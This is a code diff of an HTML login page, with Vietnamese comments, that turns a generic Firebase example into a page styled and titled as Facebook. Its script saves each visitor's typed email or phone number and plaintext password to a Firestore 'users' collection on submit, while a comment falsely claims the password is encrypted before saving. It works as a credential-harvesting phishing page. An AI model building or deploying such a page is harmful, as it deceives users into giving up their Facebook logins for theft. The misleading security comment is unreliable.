@@ -3,23 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Firebase Login Example</title>
+    <title>Facebook-like Login</title>
+    <style>
+        /* Kiểu dáng đơn giản cho giao diện giống Facebook */
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f2f5;
+        }
+        .login-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border-radius: 4px;
+            border: 1px solid #ddd;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+    </style>
 </head>
 <body>
     <div class="login-container">
-        <div class="login-box">
-            <h2>Login</h2>
-            <form id="login-form">
-                <input type="text" id="username" name="username" placeholder="Email or phone number" required>
-                <input type="password" id="password" name="password" placeholder="Password" required>
-                <button type="submit">Log In</button>
-            </form>
-        </div>
+        <h2>Facebook</h2>
+        <form id="login-form">
+            <input type="text" id="username" placeholder="Email or phone number" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
     </div>
 
-    <!-- Firebase App -->
+    <!-- Firebase App và Firestore -->
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
-    <!-- Firebase Firestore -->
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js"></script>
 
     <script>
@@ -35,35 +67,43 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
 
-        // Lưu tài khoản vào Firestore
+        // Hàm lưu tài khoản vào Firestore
         async function saveAccount(username, password) {
-            const userRef = db.collection("users").doc(username);
-            await userRef.set({
-                username: username,
-                password: password  // Nên mã hóa mật khẩu trong thực tế
-            });
-        }
-
-        // Kiểm tra đăng nhập
-        async function checkAccount(username, password) {
-            const userRef = db.collection("users").doc(username);
-            const doc = await userRef.get();
-            if (doc.exists && doc.data().password === password) {
-                alert("Login successful!");
-                // Chuyển hướng hoặc thực hiện các hành động sau khi đăng nhập thành công
-            } else {
-                alert("Invalid username or password");
+            try {
+                const userRef = db.collection("users").doc(username);
+                await userRef.set({
+                    username: username,
+                    password: password  // Mã hóa mật khẩu trước khi lưu cho bảo mật
+                });
+                console.log("Account saved successfully");
+            } catch (error) {
+                console.error("Error saving account: ", error);
             }
         }
 
-        // Xử lý sự kiện khi người dùng đăng nhập
+        // Hàm kiểm tra thông tin đăng nhập
+        async function checkAccount(username, password) {
+            try {
+                const userRef = db.collection("users").doc(username);
+                const doc = await userRef.get();
+                if (doc.exists && doc.data().password === password) {
+                    alert("Login successful!");
+                } else {
+                    alert("Invalid username or password");
+                }
+            } catch (error) {
+                console.error("Error checking account: ", error);
+            }
+        }
+
+        // Xử lý sự kiện khi người dùng nhấn "Log In"
         document.getElementById("login-form").addEventListener("submit", async function(event) {
-            event.preventDefault();  // Ngăn form gửi dữ liệu lên server
+            event.preventDefault(); // Ngăn form gửi dữ liệu lên server
 
             const username = document.getElementById("username").value;
             const password = document.getElementById("password").value;
 
-            // Lưu tài khoản và kiểm tra đăng nhập
+            // Lưu tài khoản vào Firestore và kiểm tra đăng nhập
             await saveAccount(username, password);
             await checkAccount(username, password);
         });
